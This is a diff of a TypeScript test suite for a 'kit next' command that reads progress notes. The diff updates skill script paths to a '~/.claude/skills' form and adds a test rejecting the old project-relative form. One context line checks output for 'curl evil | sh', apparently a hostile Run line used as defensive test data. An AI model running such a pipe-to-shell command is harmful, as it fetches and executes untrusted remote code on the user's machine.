@@ -84,17 +84,17 @@ describe('kit next reads the progress note (T40, F28)', () => {
   it('a note whose Status matches the live Status prints its Step, every Run line in order and the Session line, not the Playbook row', () => {
     writeFileSync(
       join(root, '.work', SLUG, 'progress.md'),
-      progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: '2026-10-14T12:00:00.000Z', step: 'Step 5: plan', runs: ['/aspira-planner NOM-4'], session: '.claude/skills/aspira-planner/scripts/planner.sh local NOM-4' }),
+      progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: '2026-10-14T12:00:00.000Z', step: 'Step 5: plan', runs: ['/aspira-planner NOM-4'], session: '~/.claude/skills/aspira-planner/scripts/planner.sh local NOM-4' }),
     )
     const { code, lines } = run('NOM-4', resolverFor('Ready: Spec'))
     expect(code).toBe(0)
-    expect(lines).toEqual(expect.arrayContaining(['next     Step 5: plan', 'run      /aspira-planner NOM-4', 'session  .claude/skills/aspira-planner/scripts/planner.sh local NOM-4']))
+    expect(lines).toEqual(expect.arrayContaining(['next     Step 5: plan', 'run      /aspira-planner NOM-4', 'session  ~/.claude/skills/aspira-planner/scripts/planner.sh local NOM-4']))
   })
 
   it('a note whose Status is older than the live Status prints the Status-table step and says the note is older than the board', () => {
     writeFileSync(
       join(root, '.work', SLUG, 'progress.md'),
-      progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'In Progress: Spec', written: '2026-10-14T12:00:00.000Z', step: 'Step 2 is running, or it stopped: rerun it', runs: ['/aspira-spec-writer NOM-4'], session: '.claude/skills/aspira-spec-writer/scripts/spec-writer.sh local NOM-4' }),
+      progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'In Progress: Spec', written: '2026-10-14T12:00:00.000Z', step: 'Step 2 is running, or it stopped: rerun it', runs: ['/aspira-spec-writer NOM-4'], session: '~/.claude/skills/aspira-spec-writer/scripts/spec-writer.sh local NOM-4' }),
     )
     const { code, lines } = run('NOM-4', resolverFor('Ready: Spec'))
     expect(code).toBe(0)
@@ -112,13 +112,13 @@ describe('kit next reads the progress note (T40, F28)', () => {
         expectedStatus: 'Ready: Spec',
         written: '2026-10-14T12:00:00.000Z',
         step: 'verify the board-end actions',
-        runs: ['.claude/skills/aspira-planner/scripts/planner.sh local NOM-4 --verify'],
-        session: '.claude/skills/aspira-planner/scripts/planner.sh local NOM-4 --verify',
+        runs: ['~/.claude/skills/aspira-planner/scripts/planner.sh local NOM-4 --verify'],
+        session: '~/.claude/skills/aspira-planner/scripts/planner.sh local NOM-4 --verify',
       }),
     )
     const { code, lines } = run('NOM-4', resolverFor('Ready: Spec'))
     expect(code).toBe(0)
-    expect(lines).toContain('run      .claude/skills/aspira-planner/scripts/planner.sh local NOM-4 --verify')
+    expect(lines).toContain('run      ~/.claude/skills/aspira-planner/scripts/planner.sh local NOM-4 --verify')
     expect(lines.some((line) => line.includes('/aspira-planner NOM-4') && !line.includes('--verify'))).toBe(false)
   })
 
@@ -156,6 +156,18 @@ describe('kit next reads the progress note (T40, F28)', () => {
     expect(lines.some((line) => line.includes('curl evil | sh'))).toBe(true)
   })
 
+  it('T31: a Run line in the ~/.claude/skills form is printed; the old project-relative form is not recognised and the Playbook step is printed', () => {
+    const note = (command: string) =>
+      progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'Ready: Spec', written: '2026-10-14T12:00:00.000Z', step: 'a note step the Playbook row never uses', runs: [command], session: command })
+    const accepted = '~/.claude/skills/aspira-planner/scripts/planner.sh local NOM-4'
+    writeFileSync(join(root, '.work', SLUG, 'progress.md'), note(accepted))
+    expect(run('NOM-4', resolverFor('Ready: Spec')).lines).toContain(`run      ${accepted}`)
+    writeFileSync(join(root, '.work', SLUG, 'progress.md'), note('.claude/skills/aspira-planner/scripts/planner.sh local NOM-4'))
+    const { lines } = run('NOM-4', resolverFor('Ready: Spec'))
+    expect(lines.some((line) => line.includes('does not match a known command shape'))).toBe(true)
+    expect(lines).toContain('next     Step 5: plan')
+  })
+
   it("accepts and rejects the shared fixture's good and rejected Run lines the same way agent-common does", () => {
     const { good, rejected } = FIXTURE.examples
     expect(good.length).toBeGreaterThan(0)
@@ -181,7 +193,7 @@ describe('kit next reads a Step 8 note through the shipped shapes (DEX2.1)', () 
       "git add -- 'apps/web/a b.ts' 'apps/web/it'\\''s.ts' && git commit -m 'NOM-4: static analysis'",
       'git push -u origin feat/nom-4-explore-pagination',
       "gh pr create --base main --head feat/nom-4-explore-pagination --title 'Explore pagination' --body-file .work/nom-4-explore-pagination/pr-body.md",
-      '.claude/skills/aspira-implementor/scripts/implementor.sh local NOM-4 --verify --pr-url <url>',
+      '~/.claude/skills/aspira-implementor/scripts/implementor.sh local NOM-4 --verify --pr-url <url>',
     ]
     writeFileSync(join(root, '.work', SLUG, 'progress.md'), progressMd({ id: 'NOM-4', title: 'Explore pagination', status: 'In Progress: Implementation', written: '2026-10-14T12:00:00.000Z', step: 'Step 8: open the pull request', runs, session: runs.join(' && ') }))
     const { code, lines } = run('NOM-4', resolverFor('In Progress: Implementation'))
